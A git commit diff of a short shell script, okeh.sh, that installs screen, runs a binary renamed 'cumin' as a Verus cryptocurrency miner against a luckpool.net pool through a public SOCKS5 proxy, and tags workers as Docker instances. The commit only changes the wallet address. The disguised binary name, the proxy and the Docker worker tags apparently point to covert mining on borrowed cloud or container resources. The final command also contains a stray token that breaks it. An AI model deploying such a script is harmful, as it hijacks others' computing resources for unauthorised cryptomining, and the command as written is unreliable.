83ff272800bf23016ac34003250fea4e6b450045
squibex <90225595+squibex@users.noreply.github.com>
2021-12-14 05:43:11 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
-WALLET=RTMnP39ZBF9UJB2xKDT7FAp8iZ2eW7wemU
+WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=$(echo $(shuf -i 1-10 -n 1)-DOCKER)
 PROXY=socks5://184.185.2.244:4145
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER (kolek) -t 2 -x $PROXY
